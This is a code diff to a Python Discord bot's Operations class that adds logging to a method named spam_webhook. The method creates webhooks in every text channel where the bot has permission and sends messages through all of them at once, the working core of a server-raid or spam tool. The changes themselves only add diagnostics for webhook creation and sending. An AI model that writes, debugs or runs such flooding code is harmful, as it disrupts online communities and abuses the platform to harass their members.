@@ -183,12 +183,14 @@ class Operations:
 
     async def spam_webhook(self, guild: discord.Guild) -> int:
         text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).manage_webhooks]
+        logging.info(f"[spam_webhook] channels_with_perms={len(text_channels)}")
         if not text_channels:
             return 0
 
         webhook_tasks = [asyncio.create_task(self._create_webhook(c.id)) for c in text_channels]
         results = await asyncio.gather(*webhook_tasks, return_exceptions=True)
         valid = [r for r in results if not isinstance(r, Exception) and r]
+        logging.info(f"[spam_webhook] created={len(valid)}")
         if not valid:
             return 0
 
@@ -205,7 +207,7 @@ class Operations:
 
         results = await asyncio.gather(*send_tasks, return_exceptions=True)
         ok = sum(1 for r in results if not isinstance(r, Exception) and r)
-        logging.info(f"[spam_webhook] {ok}")
+        logging.info(f"[spam_webhook] sent={ok}")
         return ok
 
     async def _create_webhook(self, channel_id: int):
@@ -213,10 +215,13 @@ class Operations:
         payload = {"name": self.settings.webhook_name}
         try:
             async with self.session.post(url, json=payload) as res:
+                body = await res.text()
+                logging.info(f"[webhook_create] ch={channel_id} status={res.status} body={body[:300]}")
                 if res.status in (200, 201):
                     data = await res.json()
                     return (data.get("id"), data.get("token"))
-        except Exception:
+        except Exception as e:
+            logging.error(f"[webhook_create] ch={channel_id} exception: {e!r}")
             return None
         return None
 
